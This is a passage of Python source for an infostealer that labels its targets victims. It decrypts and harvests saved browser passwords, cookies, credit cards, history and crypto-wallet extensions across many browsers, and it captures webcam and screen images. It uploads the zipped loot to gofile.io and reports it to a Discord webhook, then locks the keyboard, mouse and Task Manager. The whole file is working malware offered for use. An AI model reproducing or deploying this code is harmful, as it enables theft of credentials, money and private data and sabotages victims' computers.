        if not os.path.exists(v4r_path):
            return None

        try:
            with open(v4r_path, 'r', encoding='utf-8') as v4r_f:
                v4r_local_state = json.load(v4r_f)

            v4r_encrypted_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
            v4r_master_key = win32crypt.CryptUnprotectData(v4r_encrypted_key, None, None, None, 0)[1]
            return v4r_master_key
        except:
            return None

    def D3f_Decrypt(v4r_buff, v4r_master_key):
        try:
            v4r_iv = v4r_buff[3:15]
            v4r_payload = v4r_buff[15:-16]
            v4r_tag = v4r_buff[-16:]
            v4r_cipher = Cipher(algorithms.AES(v4r_master_key), modes.GCM(v4r_iv, v4r_tag))
            v4r_decryptor = v4r_cipher.decryptor()
            v4r_decrypted_pass = v4r_decryptor.update(v4r_payload) + v4r_decryptor.finalize()
            return v4r_decrypted_pass.decode()
        except:
            return None
        
    def D3f_GetPasswords(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_passwords
        v4r_password_db = os.path.join(v4r_profile_path, 'Login Data')
        if not os.path.exists(v4r_password_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_password_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            v4r_url =          f"- Url      : {v4r_row[0]}"
            v4r_username =     f"  Username : {v4r_row[1]}"
            v4r_password =     f"  Password : {D3f_Decrypt(v4r_row[2], v4r_master_key)}"
            v4r_browser_name = f"  Browser  : {v4r_browser}"
            v4r_file_passwords.append(f"{v4r_url}\n{v4r_username}\n{v4r_password}\n{v4r_browser_name}\n")
            v4r_number_passwords += 1

        v4r_conn.close()

    def D3f_GetCookies(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_cookies
        v4r_cookie_db = os.path.join(v4r_profile_path, 'Network', 'Cookies')
        if not os.path.exists(v4r_cookie_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_cookie_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            v4r_url =          f"- Url     : {v4r_row[0]}"
            v4r_name =         f"  Name    : {v4r_row[1]}"
            v4r_path =         f"  Path    : {v4r_row[2]}"
            v4r_cookie =       f"  Cookie  : {D3f_Decrypt(v4r_row[3], v4r_master_key)}"
            v4r_expire =       f"  Expire  : {v4r_row[4]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_cookies.append(f"{v4r_url}\n{v4r_name}\n{v4r_path}\n{v4r_cookie}\n{v4r_expire}\n{v4r_browser_name}\n")
            v4r_number_cookies += 1

        v4r_conn.close()

    def D3f_GetHistory(v4r_browser, v4r_profile_path):
        global v4r_number_history
        v4r_history_db = os.path.join(v4r_profile_path, 'History')
        if not os.path.exists(v4r_history_db):
            return
        
        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_history_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            v4r_url =          f"- Url     : {v4r_row[0]}"
            v4r_title =        f"  Title   : {v4r_row[1]}"
            v4r_time =         f"  Time    : {v4r_row[2]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_history.append(f"{v4r_url}\n{v4r_title}\n{v4r_time}\n{v4r_browser_name}\n")
            v4r_number_history += 1

        v4r_conn.close()
    
    def D3f_GetDownloads(v4r_browser, v4r_profile_path):
        global v4r_number_downloads
        v4r_downloads_db = os.path.join(v4r_profile_path, 'History')
        if not os.path.exists(v4r_downloads_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_downloads_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in v4r_cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            v4r_path =         f"- Path    : {row[1]}"
            v4r_url =          f"  Url     : {row[0]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_downloads.append(f"{v4r_path}\n{v4r_url}\n{v4r_browser_name}\n")
            v4r_number_downloads += 1

        v4r_conn.close()
    
    def D3f_GetCards(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_cards
        v4r_cards_db = os.path.join(v4r_profile_path, 'Web Data')
        if not os.path.exists(v4r_cards_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_cards_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            v4r_name =             f"- Name             : {v4r_row[0]}"
            v4r_expiration_month = f"  Expiration Month : {v4r_row[1]}"
            v4r_expiration_year =  f"  Expiration Year  : {v4r_row[2]}"
            v4r_card_number =      f"  Card Number      : {D3f_Decrypt(v4r_row[3], v4r_master_key)}"
            v4r_date_modified =    f"  Date Modified    : {v4r_row[4]}"
            v4r_browser_name =     f"  Browser          : {v4r_browser}"
            v4r_file_cards.append(f"{v4r_name}\n{v4r_expiration_month}\n{v4r_expiration_year}\n{v4r_card_number}\n{v4r_date_modified}\n{v4r_browser_name}\n")
            v4r_number_cards += 1
        
        v4r_conn.close()

    def D3f_GetExtentions(v4r_zip_file, v4r_extensions_names, v4r_browser, v4r_profile_path):
        global v4r_number_extentions
        v4r_extensions_path = os.path.join(v4r_profile_path, 'Extensions')
        v4r_zip_folder = os.path.join("Extensions", v4r_browser)

        if not os.path.exists(v4r_extensions_path):
            return 

        v4r_extentions = [v4r_item for v4r_item in os.listdir(v4r_extensions_path) if os.path.isdir(os.path.join(v4r_extensions_path, v4r_item))]
        
        for v4r_extention in v4r_extentions:
            if "Temp" in v4r_extention:
                continue
            
            v4r_number_extentions += 1
            v4r_extension_found = False
            
            for v4r_extension_name, v4r_extension_folder in v4r_extensions_names:
                if v4r_extention == v4r_extension_folder:
                    v4r_extension_found = True
                    
                    v4r_extension_folder_path = os.path.join(v4r_zip_folder, v4r_extension_name, v4r_extention)
                    
                    v4r_source_extension_path = os.path.join(v4r_extensions_path, v4r_extention)
                    for v4r_item in os.listdir(v4r_source_extension_path):
                        v4r_item_path = os.path.join(v4r_source_extension_path, v4r_item)
                        
                        if os.path.isdir(v4r_item_path):
                            for dirpath, dirnames, filenames in os.walk(v4r_item_path):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, v4r_source_extension_path)
                                    v4r_zip_file.write(file_path, os.path.join(v4r_extension_folder_path, arcname))
                        else:
                            v4r_zip_file.write(v4r_item_path, os.path.join(v4r_extension_folder_path, v4r_item))
                    break

            if not v4r_extension_found:
                v4r_other_folder_path = os.path.join(v4r_zip_folder, "Unknown Extension", v4r_extention)
                
                v4r_source_extension_path = os.path.join(v4r_extensions_path, v4r_extention)
                for v4r_item in os.listdir(v4r_source_extension_path):
                    v4r_item_path = os.path.join(v4r_source_extension_path, v4r_item)
                    
                    if os.path.isdir(v4r_item_path):
                        for dirpath, dirnames, filenames in os.walk(v4r_item_path):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, v4r_source_extension_path)
                                v4r_zip_file.write(file_path, os.path.join(v4r_other_folder_path, arcname))
                    else:
                        v4r_zip_file.write(v4r_item_path, os.path.join(v4r_other_folder_path, v4r_item))

    v4r_browser_files = [
        ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
        ("Google Chrome Beta",     os.path.join(v4r_path_appdata_local,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(v4r_path_appdata_local,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(v4r_path_appdata_local,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(v4r_path_appdata_local,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(v4r_path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(v4r_path_appdata_local,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(v4r_path_appdata_local,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(v4r_path_appdata_local,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(v4r_path_appdata_local,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(v4r_path_appdata_local,   "Kometa", "User Data"),                           "kometa.exe"),
        ("Orbitum",                os.path.join(v4r_path_appdata_local,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(v4r_path_appdata_local,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(v4r_path_appdata_local,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(v4r_path_appdata_local,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(v4r_path_appdata_local,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(v4r_path_appdata_local,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(v4r_path_appdata_local,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(v4r_path_appdata_roaming, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(v4r_path_appdata_roaming, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    v4r_profiles = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    v4r_extensions_names = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for v4r_name, v4r_path, v4r_proc_name in v4r_browser_files:
            for v4r_proc in psutil.process_iter(['pid', 'name']):
                try:
                    if v4r_proc.name().lower() == v4r_proc_name.lower():
                        v4r_proc.terminate()
                except:
                    pass
    except:
        pass

    for v4r_name, v4r_path, v4r_proc_name in v4r_browser_files:
        if not os.path.exists(v4r_path):
            continue

        v4r_master_key = D3f_GetMasterKey(os.path.join(v4r_path, 'Local State'))
        if not v4r_master_key:
            continue

        for v4r_profile in v4r_profiles:
            v4r_profile_path = os.path.join(v4r_path, v4r_profile)
            if not os.path.exists(v4r_profile_path):
                continue

        for v4r_profile in v4r_profiles:
            v4r_profile_path = os.path.join(v4r_path, v4r_profile)
            if not os.path.exists(v4r_profile_path):
                continue
            
            if "extentions" in v4r_browser_choice:
                try: D3f_GetExtentions(v4r_zip_file, v4r_extensions_names, v4r_name, v4r_profile_path)
                except: pass
                
            if "passwords" in v4r_browser_choice:
                try: D3f_GetPasswords(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass
            if "cookies" in v4r_browser_choice:
                try: D3f_GetCookies(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass
            if "history" in v4r_browser_choice:
                try: D3f_GetHistory(v4r_name, v4r_profile_path)
                except: pass
            if "downloads" in v4r_browser_choice:
                try: D3f_GetDownloads(v4r_name, v4r_profile_path)
                except: pass
            if "cards" in v4r_browser_choice:
                try: D3f_GetCards(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass

            if v4r_name not in v4r_browsers:
                v4r_browsers.append(v4r_name)

    if "passwords" in v4r_browser_choice:
        if not v4r_file_passwords:
            v4r_file_passwords.append("No passwords was saved on the victim's computer.")
        v4r_file_passwords = "\n".join(v4r_file_passwords)
    if "cookies" in v4r_browser_choice:
        if not v4r_file_cookies:
            v4r_file_cookies.append("No cookies was saved on the victim's computer.")
        v4r_file_cookies   = "\n".join(v4r_file_cookies)
    if "history" in v4r_browser_choice:
        if not v4r_file_history:
            v4r_file_history.append("No history was saved on the victim's computer.")
        v4r_file_history   = "\n".join(v4r_file_history)
    if "downloads" in v4r_browser_choice:
        if not v4r_file_downloads:
            v4r_file_downloads.append("No downloads was saved on the victim's computer.")
        v4r_file_downloads = "\n".join(v4r_file_downloads)
    if "cards" in v4r_browser_choice:
        if not v4r_file_cards:
            v4r_file_cards.append("No cards was saved on the victim's computer.")
        v4r_file_cards     = "\n".join(v4r_file_cards)
    
    if v4r_number_passwords != None:
        v4r_zip_file.writestr(f"Passwords ({v4r_number_passwords}).txt", v4r_file_passwords)

    if v4r_number_cookies != None:
        v4r_zip_file.writestr(f"Cookies ({v4r_number_cookies}).txt", v4r_file_cookies)

    if v4r_number_cards != None:
        v4r_zip_file.writestr(f"Cards ({v4r_number_cards}).txt", v4r_file_cards)

    if v4r_number_history != None:
        v4r_zip_file.writestr(f"Browsing History ({v4r_number_history}).txt", v4r_file_history)

    if v4r_number_downloads != None:
        v4r_zip_file.writestr(f"Download History ({v4r_number_downloads}).txt",v4r_file_downloads)

    return v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

def D3f_W3bc4m(v4r_zip_file):
    import cv2
    import io
    from PIL import Image

    try:
        v4r_status_camera_capture = "Yes"
        v4r_cap = cv2.VideoCapture(0)

        if not v4r_cap.isOpened():
            v4r_status_camera_capture = "No webcam found."
            return v4r_status_camera_capture

        v4r_ret, v4r_frame = v4r_cap.read()
        v4r_cap.release()

        if not v4r_ret:
            v4r_status_camera_capture = "Failed to capture image."
            D3f_Clear()
            return v4r_status_camera_capture

        v4r_frame_rgb = cv2.cvtColor(v4r_frame, cv2.COLOR_BGR2RGB)
        v4r_img_pil = Image.fromarray(v4r_frame_rgb)
        v4r_img_bytes = io.BytesIO()
        v4r_img_pil.save(v4r_img_bytes, format='PNG')
        v4r_img_bytes.seek(0)
        v4r_zip_file.writestr("Webcam.png", v4r_img_bytes.read())

        return v4r_status_camera_capture

    except Exception as e:
        v4r_status_camera_capture = f"Error: {e}"
        return v4r_status_camera_capture

def D3f_Scr33n5h0t(zip_file):
    import io
    from PIL import ImageGrab

    try:
        v4r_number_screenshot = "Yes"

        def C4ptur3():
            v4r_image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            v4r_image_bytes = io.BytesIO()
            v4r_image.save(v4r_image_bytes, format='PNG')
            v4r_image_bytes.seek(0)
            return v4r_image_bytes

        v4r_image_bytes = C4ptur3()
        zip_file.writestr("Screenshot.png", v4r_image_bytes.read())
        return v4r_number_screenshot
    except Exception as e:
        v4r_number_screenshot = f"Error: {e}"
        return v4r_number_screenshot

def D3f_B10ckK3y():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.block_key(k3y_b10ck)
        except: pass

def D3f_Unb10ckK3y():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.unblock_key(k3y_b10ck)
        except: pass

def D3f_B10ckM0u53():
    import pyautogui
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)

def D3f_B10ckT45kM4n4g3r():
    import psutil
    import subprocess
    import os

    "Perm Admin Required"
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def D3f_Sp4mOpti0ns():
    import keyboard
    while True:
        try:
            D3f_B10ckM0u53()
            D3f_Sp4m0p3nPr0gr4m()
            D3f_Sp4mCr34tFil3()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass

v4r_option = []

v4r_zip_buffer = io.BytesIO()
with zipfile.ZipFile(v4r_zip_buffer, "w", zipfile.ZIP_DEFLATED) as v4r_zip_file:

    try: 
        v4r_number_discord_injection = D3f_Di5c0rdInj3c710n()
    except Exception as e:
        v4r_number_discord_injection = f"Error: {e}"

    try: 
        v4r_status_system_info = D3f_Sy5t3mInf0(v4r_zip_file)
    except Exception as e:
        v4r_status_system_info = f"Error: {e}"

    try: 
        v4r_number_discord_account = D3f_Di5c0rdAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_discord_account = f"Error: {e}"

    try: 
        v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards = D3f_Br0w53r5t341(v4r_zip_file)
    except Exception as e:
        v4r_number_extentions = f"Error: {e}"
        v4r_number_passwords = f"Error: {e}"
        v4r_number_cookies = f"Error: {e}"
        v4r_number_history = f"Error: {e}"
        v4r_number_downloads = f"Error: {e}"
        v4r_number_cards = f"Error: {e}"

    try: 
        v4r_number_roblox_account = D3f_R0b10xAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_roblox_account = f"Error: {e}"

    try: 
        v4r_status_camera_capture = D3f_W3bc4m(v4r_zip_file)
    except Exception as e:
        v4r_status_camera_capture = f"Error: {e}"

    try: 
        v4r_status_screenshot = D3f_Scr33n5h0t(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
        v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps = D3f_S3ssi0nFil3s(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
        v4r_number_files = D3f_Int3r3stingFil3s(v4r_zip_file)
    except Exception as e:
        v4r_number_files = f"Error: {e}"

    if v4r_number_discord_injection != None:
        v4r_option.append(f"Discord Injection : {v4r_number_discord_injection}")

    if v4r_status_camera_capture != None:
        v4r_option.append(f"Camera Capture    : {v4r_status_camera_capture}")

    if v4r_status_screenshot != None:
        v4r_option.append(f"Screenshot        : {v4r_status_screenshot}")

    if v4r_status_system_info != None:
        v4r_option.append(f"System Info       : {v4r_status_system_info}")

    if v4r_number_discord_account != None:
        v4r_option.append(f"Discord Accounts  : {v4r_number_discord_account}")

    if v4r_number_roblox_account != None:
        v4r_option.append(f"Roblox Accounts   : {v4r_number_roblox_account}")

    if v4r_number_passwords != None:
        v4r_option.append(f"Passwords         : {v4r_number_passwords}")

    if v4r_number_cookies != None:
        v4r_option.append(f"Cookies           : {v4r_number_cookies}")

    if v4r_number_cards != None:
        v4r_option.append(f"Cards             : {v4r_number_cards}")

    if v4r_number_history != None:
        v4r_option.append(f"Browsing History  : {v4r_number_history}")

    if v4r_number_downloads != None:
        v4r_option.append(f"Download History  : {v4r_number_downloads}")

    if v4r_number_extentions != None:
        v4r_option.append(f"Extentions        : {v4r_number_extentions}")

    if v4r_name_wallets != None:
        v4r_option.append(f"Wallets           : {v4r_name_wallets}")

    if v4r_name_game_launchers != None:
        v4r_option.append(f"Game Launchers    : {v4r_name_game_launchers}")
    
    if v4r_name_apps != None:
        v4r_option.append(f"Apps              : {v4r_name_apps}")
    
    if v4r_number_files != None:
        v4r_option.append(f"Interesting Files : {v4r_number_files}")

v4r_zip_buffer.seek(0)

try:
    try: v4r_gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
    except: v4r_gofileserver = "store4"

    v4r_response = requests.post(
        f"https://{v4r_gofileserver}.gofile.io/uploadFile",
        files={"file": (f"RedTiger_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)}
    )

    v4r_download_link = v4r_response.json()["data"]["downloadPage"]
except Exception as e:
    v4r_download_link = f"Error: {e}"

embed = discord.Embed(title="Victim Affected", color=v4r_color_embed
).add_field(
    inline=False,
    name="Summary of Information", 
    value=f"""```
Hostname    : {v4r_hostname_pc}
Username    : {v4r_username_pc}
DisplayName : {v4r_displayname_pc}
Ip Public   : {v4r_ip_address_public}
Ip Local    : {v4r_ip_adress_local}
Country     : {v4r_country}```"""
).add_field(
    inline=False,
    name="Stolen Information", 
    value=f"""```swift
{"\n".join(v4r_option)}```"""
).add_field(
    inline=False,
    name="Download Link", 
    value=f"""{v4r_download_link}"""
).set_footer(
    text=v4r_footer_text, 
    icon_url=v4r_avatar_embed
)

try:  
    v4r_w3bh00k = discord.SyncWebhook.from_url(v4r_w3bh00k_ur1)
    v4r_w3bh00k.send(embed=embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
except: pass


try: threading.Thread(target=D3f_B10ckK3y).start()
except: pass
try: threading.Thread(target=D3f_B10ckT45kM4n4g3r).start()
except: pass
try: threading.Thread(target=D3f_B10ckW3b5it3).start()
except: pass
try: threading.Thread(target=D3f_St4rtup).start()
except: pass
try: threading.Thread(target=D3f_Sp4m_Opti0ns).start()
except: pass
try: threading.Thread(target=D3f_R3st4rt).start()
except: pass
try: threading.Thread(target=D3f_F4k33rr0r).start()
except: pass
try: threading.Thread(target=D3f_Shutd0wn).start()
except: pass
